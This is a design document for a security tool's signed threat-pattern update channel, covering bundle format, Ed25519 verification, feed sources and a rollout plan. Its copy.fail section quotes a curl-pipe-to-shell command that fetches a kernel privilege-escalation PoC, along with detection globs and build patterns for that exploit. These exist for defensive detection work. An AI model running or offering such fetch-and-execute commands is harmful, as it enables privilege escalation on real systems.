# security guard — pattern updates

How atty/atty-guard get fresh threat data **between releases**. Driven by incidents like Shai-Hulud (npm worm, hundreds of compromised packages) and CVE-2026-31431 / copy.fail (kernel LPE with a tiny, easily-renamed PoC) — both of which we'd want to flag the day disclosure lands, not on the next atty cargo-release cadence.

Status: **design, fetcher impl ahead.** This document describes the bundle format + verification protocol; PR series that lands the fetcher tracks under V2-F.

## Goals

- **Same-day IOCs.** When a major incident lands, ship a signed pattern bundle that atty-guard installs in seconds. No atty rebuild required.
- **Verifiable.** Bundles are Ed25519-signed; atty-guard pins the publisher key at compile time. A compromised CDN can't push malicious bundles.
- **Offline-safe.** If the update server is unreachable atty-guard keeps using its last-good bundle (or the bundled-in defaults). Never fail-open.
- **Multi-source.** OSV / GitHub Advisory DB / kernel.org CVE feed each speak different formats — atty-guard's update layer **normalises** to one bundle shape, fetched from one publisher we control.

## Bundle format

A bundle is a `tar.zst` of declarative data files plus a manifest. Tiny — current footprint is ~10 KB compressed.

```
atty-guard-data-2026-05-19.tar.zst
├── manifest.toml          required, signed below
├── flagged_npm.txt        same shape as the bundled-in seed file
├── flagged_urls.txt       known IOC URLs (PoC hosts, malicious CDNs)
├── flagged_kernel.toml    CVE → match-shape mappings for kernel exploits
└── heuristics.toml        regex tweaks for the Tier-2 HeuristicBackend
```

### `manifest.toml`

```toml
[bundle]
version    = "2026-05-19"          # ISO date — bundles versioned by publication day
schema     = 1                      # bumped only on breaking field changes
expires_at = "2026-11-19T00:00:00Z" # 6-month TTL; atty-guard refuses bundles past this

[publisher]
# Pinned in atty-guard at compile time; bundles signed with a different
# key are rejected.
ed25519_pubkey_id = "atty-pattern-publisher-v1"

[contents]
# Files this bundle ships. Each gets a SHA-256 so a corrupted file fails
# verification individually (the bundle-level signature covers the manifest
# only; per-file hashes prevent in-archive tampering).
"flagged_npm.txt"       = "sha256:7a2b…"
"flagged_urls.txt"      = "sha256:e1c8…"
"flagged_kernel.toml"   = "sha256:1f9d…"
"heuristics.toml"       = "sha256:5c8a…"
```

The `.sig` lives next to the `.tar.zst`:

```
atty-guard-data-2026-05-19.tar.zst.sig    # Ed25519(manifest.toml)
```

## Verification protocol

```
fetch(<source>/atty-guard-data-LATEST.tar.zst)
fetch(<source>/atty-guard-data-LATEST.tar.zst.sig)
verify_ed25519(manifest.toml, .sig, pinned_pubkey)
for file in manifest.contents:
    extract_to_tmp(file)
    verify_sha256(file)
check_not_expired(manifest.expires_at)
atomic_rename(tmp_dir → $XDG_DATA_HOME/atty-guard/patterns/)
SIGHUP self
```

Each step fails open to "keep using current bundle" — we never delete or replace partial data.

## Source

Initial: GitHub Releases on `fentas/atty-guard-data` (separate repo for clean signing key rotation, separate review). Published by CI from a curated source of truth that auto-mirrors:

- **OSV API** for npm/PyPI/cargo malicious-package disclosures.
- **GitHub Advisory DB** for ecosystem CVEs.
- **kernel.org CVE feed** (RSS) for kernel LPEs / RCEs.
- **Maintainer-curated** for IOC URLs (exploit PoC hosting, malicious CDN domains, copy.fail-class incident pages).

The aggregation lives in `fentas/atty-guard-data`'s CI; output is the signed bundle. atty-guard doesn't poll OSV/GitHub directly — it just consumes the merged feed.

## Schedule

| Stage | What lands | When |
|-------|------------|------|
| 1 | This doc + skeleton `data_update.rs` + bundle-format types. | This PR. |
| 2 | Local-file source (`atty-guard --update-from /path/to/bundle.tar.zst`). Useful for testing, offline-installs, air-gapped envs. | Next PR. |
| 3 | HTTPS fetcher + signature verification + atomic install. | After Stage 2 lands + a real signing key is set up. |
| 4 | systemd-user timer for periodic refresh (default: daily at random offset to avoid synchronised thundering herds). | After Stage 3. |
| 5 | Schema 2 — adds runtime-reloadable Tier-2 heuristics + structured kernel-exploit shapes. | When the bundle outgrows v1. |

## Why not pull OSV / GitHub Advisory directly from atty-guard

Tempting (one less repo to ship), but:

- **Rate limits / API tokens.** OSV is generous; GitHub Advisory needs a token. Distributing tokens to every atty install is the wrong shape.
- **Privacy.** Hitting OSV directly leaks which atty installs are active. The aggregated bundle decouples that.
- **Normalisation.** OSV records every npm bad-package since 2020 — far more than the focused fast-path list atty's V1 wants. The aggregator filters down to high-confidence, recent, high-blast-radius entries.

V2-F (the "live OSV lookup at classify time" follow-up from `security-guard-design.md`) is still on the roadmap — but it's the SECOND layer behind this offline-bundle path, not a replacement.

## Why a separate signing key from atty's release

- atty maintainer key signs `atty` binaries.
- `atty-pattern-publisher-v1` key signs pattern bundles.
- Different rotation cadence (pattern bundles ship more often).
- Compromising the binary key shouldn't auto-let an attacker push pattern updates that downgrade detection.

Keys live in a hardware token (YubiKey or equivalent), not on the CI runner. CI fetches a one-shot signature via maintainer push.

## copy.fail-specific notes

CVE-2026-31431 is a kernel LPE — atty can't catch it from typed commands directly. What we CAN add via this update channel:

- **`flagged_urls.txt`** — the Theori PoC repo URL + known mirrors. `curl https://github.com/<theori>/copyfail | sh` would trigger.
- **`flagged_kernel.toml`** — the CVE → shell-shape mapping. Future:
  ```toml
  [["CVE-2026-31431"]]
  description = "copy.fail LPE — AF_ALG + splice race"
  fetcher_globs = [
      "*github.com/theori-io/copyfail*",
      "*copyfail.security*",
  ]
  build_patterns = [
      "gcc -static -o /tmp/* */copy*.c",
  ]
  ebpf_hint = "lsm/socket_create AF_ALG from short-lived process"
  ```
- **eBPF hint** — V2-B's tracepoint catalogue grows a `socket_create(AF_ALG)` watcher. The bundle declares the hint; atty-guard's BPF program reads it on startup.

The kernel-side eBPF watcher is the only reliable detection of an actual exploitation attempt. The typed-line patterns catch "user knowingly fetches the public PoC"; an attacker who already has shell access skips all of that.
